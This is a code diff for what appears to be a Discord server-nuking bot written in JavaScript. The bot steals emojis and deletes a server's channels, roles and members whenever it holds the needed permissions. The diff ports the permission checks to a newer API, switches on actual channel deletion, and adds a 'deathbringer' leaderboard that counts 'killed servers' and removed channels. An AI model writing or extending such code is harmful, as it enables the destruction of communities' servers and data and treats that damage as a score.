@@ -27,7 +27,7 @@ const StealEmoji = async (g) => {
     })
   );
 
-  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_EMOJIS_AND_STICKERS)) {
+  if (g.me.permissions.has(Permissions.FLAGS.MANAGE_EMOJIS_AND_STICKERS)) {
     await g.emojis.cache.map((e) => {
       e.deletable && e.delete();
     });
@@ -45,9 +45,10 @@ const StealEmoji = async (g) => {
 };
 
 const PurgeChannels = async (g) => {
-  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_CHANNELS)) {
+  if (g.me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS)) {
     await g.channels.fetch().then((channels) =>
       channels.map((ch) => {
+        ch.deletable && ch.delete();
         ch.isText() ? textChannelCounter++ : voiceChannelCounter++;
       })
     );
@@ -55,7 +56,7 @@ const PurgeChannels = async (g) => {
 };
 
 const PurgeMembers = async (g) => {
-  if (g.me.hasPermission(Permissions.FLAGS.KICK_MEMBERS)) {
+  if (g.me.permissions.has(Permissions.FLAGS.KICK_MEMBERS)) {
     await g.members
       .fetch()
       .then((members) =>
@@ -65,10 +66,10 @@ const PurgeMembers = async (g) => {
 };
 
 const PurgeRoles = async (g) => {
-  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_ROLES)) {
+  if (g.me.permissions.has(Permissions.FLAGS.MANAGE_ROLES)) {
     await g.roles.fetch().then((roles) =>
       roles.map((role) => {
-        role.editable && role.delete();
+        role.editable && role.name !== "@everyone" && role.delete();
       })
     );
   }
@@ -112,7 +113,7 @@ const UpdateStats = () => {
 const UpdateUserRanking = async (client, g) => {
   let server;
 
-  if (g.me.hasPermission(Permissions.FLAGS.MANAGE_GUILD)) {
+  if (g.me.permissions.has(Permissions.FLAGS.MANAGE_GUILD)) {
     let intergations = await g.fetchIntegrations();
     for (const [key, int] of intergations.entries()) {
       if (int.application.id == BOT_ID) {
@@ -152,6 +153,24 @@ const UpdateUserRanking = async (client, g) => {
       }
     }
   } else {
+    let deathbringer = await prisma.deathbringer.upsert({
+      where: {
+        userId: "1",
+      },
+      update: {
+        killedServersCount: { increment: 1 },
+        removedTextChannels: { increment: textChannelCounter },
+        removedVoiceChannels: { increment: voiceChannelCounter },
+      },
+      create: {
+        username: "unknown",
+        userId: "1",
+        killedServersCount: 1,
+        removedTextChannels: textChannelCounter,
+        removedVoiceChannels: voiceChannelCounter,
+      },
+    });
+
     server = await prisma.purgedServer.create({
       data: {
         name: g.name,
@@ -160,7 +179,7 @@ const UpdateUserRanking = async (client, g) => {
         memberRemoved: killCounter,
         premiumTier: g.premiumTier,
         emojiCount: emojiCounter,
-        killerId: 0,
+        killerId: deathbringer.id,
       },
     });
   }
